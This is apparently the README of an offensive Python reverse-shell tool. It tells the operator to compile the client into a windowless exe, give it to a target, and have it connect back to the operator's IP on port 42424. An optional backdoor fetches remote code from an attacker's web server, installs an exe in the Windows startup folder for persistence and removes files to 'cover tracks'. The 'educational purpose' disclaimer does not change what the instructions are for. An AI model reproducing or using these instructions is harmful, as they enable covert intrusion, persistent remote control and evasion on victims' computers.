![](http://myspecialsite.host20.uk/Icon%20image.png)
***
# Overview
This is a hacking tool to get a reverse shell.

This is tool is for educational purpose only!

The responsibility on every use of this tool is on the user only!

Disclaimer: This reverse shell should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal. 
***
## Installation 
Type in the command line `pip install -r requirements.txt` to install all required modules
***
## How to use
Make sure that you have port forwarding on port 42424 (you can change it if you want) to your computer.
Also make sure that you enable the port on your local firewall (inbound and outbound)
***
## Client
Make sure that you have you public IP address there on `s.connect((%PUBLIC IP ADDRESS%, 42424))`
***
## Convert client.py to .exe
Type in the terminal `pyinstaller -w --onefile "Multiple Clients/client.py"`.
Then you can delete the .spec file and the build folder.
The exe will be in "dist" folder.
 ***
## Using the tool
Start **server.py** using the following command:
`python3 server.py`
and wait for connection.

To see of all your connections type `snake> list` in the interactive prompt.

To send commands to one of your connections type `select` and the ID number of the connection.

E.X.:

`snake> select 0`

When you are in the reverse shell of one of your connection, you can type `getos` to see what OS is running on your connection machine.

To get a list of all the commands of the interactive prompt and other special commands, type `help` in the interactive prompt.

If you want to quit from your connection, type `quit` and then you'll be back in the interactive prompt.

If you want to quit from the entire program type `shutdown` in the interactive prompt.
***
## Sending files
To send files to a client type in the interative prompt the following command
`send`

Then you'll get a list of all connection, select a connection by its number on the left side of connections table.
after that you can choose between entering the path manually or by a file dialog, notice that the file dialog will create another window (Thats how tkinter file dialog works) don't close it or else you'll get some errors!
***
# Backdoor
If you want to plant also a backdoor give the user an exe version of the **client.py** from the folder **"Multi client and backdoor"**.

Upload the file **backdoor.py** to a server that you do a GET request to and change the address in **client.py** from 
`request = requests.get("http://webserver.com/backdoor.py")` to
`request = requests.get("%YOUR WEB SERVER ADDRESS%/backdoor.py")`

Alse make sure that you change `debug = True` to `debug = False` when you give to the file to the client, 
or else, the backdoor process won't be created, and if the request won't work, messages will be displayed (on the console) 

Make sure that the target computer have python 3 installed and pip or else the backdoor won't be installed.
## how the backdoor works
When the user open the program (exe version of **client.py**) the program will have 3 processes:
* The main process - The GUI
* The commands process - connects to the server and executes commands
* The backdoor process - get the code from the webserver and creates an exe version of it and saves it the startup folder (only from Windows machines for now)
What the backdoor process is exactly doing is, it saves the code from the webserver and saves on a file names **temp.py** (the file will be automatically removed), then a the process executes a pyinstaller command which creates an exe version of the backdoor in the startup folder which will make start automatically every time the machine starts and removes all unnecessary folders and files to cover tracks.

To change the name of the backdoor file find this line:
`name = "backdoor"  # Here you can change the name of the backdoor app` 
and change the value to the name you want
***
## Collaboration
If you want to collaborate with me about this project or about any other project, contact me on **ofer026@gmail.com**
